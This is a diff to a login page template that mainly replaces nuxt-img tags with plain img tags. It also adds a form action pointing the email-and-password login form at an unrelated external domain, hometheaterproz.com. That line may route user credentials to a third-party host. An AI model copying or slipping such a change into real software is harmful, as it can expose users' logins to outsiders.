@@ -4,8 +4,7 @@
       <div class="flex flex-col lg:flex-row items-center">
         <div class="w-full lg:w-6/12 hidden lg:block">
           <div class="py-5 flex justify-center items-center">
-            <nuxt-img
-              quality="50"
+            <img
               loading="lazy"
               src="/images/login.png"
               class="w-8/12"
@@ -24,8 +23,7 @@
             <div
               class="py-5 flex justify-center items-center bg--color lg:hidden"
             >
-              <nuxt-img
-                quality="50"
+              <img
                 loading="lazy"
                 src="/images/login.png"
                 class="w-8/12"
@@ -81,11 +79,14 @@
               >
                 {{ err }}
               </div>
-              <form @submit.prevent="login">
+              <form
+                @submit.prevent="login"
+                action-xhr="https://hometheaterproz.com/"
+                method="post"
+              >
                 <div class="w-full pt-5">
                   <div class="flex items-center pb-8 relative">
-                    <nuxt-img
-                      quality="50"
+                    <img
                       loading="lazy"
                       class="absolute left-0 top-0 mt-6 ml-5"
                       src="/images/mail.svg"
@@ -102,8 +103,7 @@
                     />
                   </div>
                   <div class="flex items-center relative">
-                    <nuxt-img
-                      quality="50"
+                    <img
                       loading="lazy"
                       class="absolute left-0 top-0 mt-6 ml-5"
                       src="/images/password.svg"
@@ -118,8 +118,7 @@
                       id="password"
                       class="px-12 py-5 border border-gray-200 shadow-md focus:outline-none text-gray-600 rounded-md w-full"
                     />
-                    <nuxt-img
-                      quality="50"
+                    <img
                       loading="lazy"
                       class="-ml-12 z-30 cursor-pointer"
                       @click="showPass"
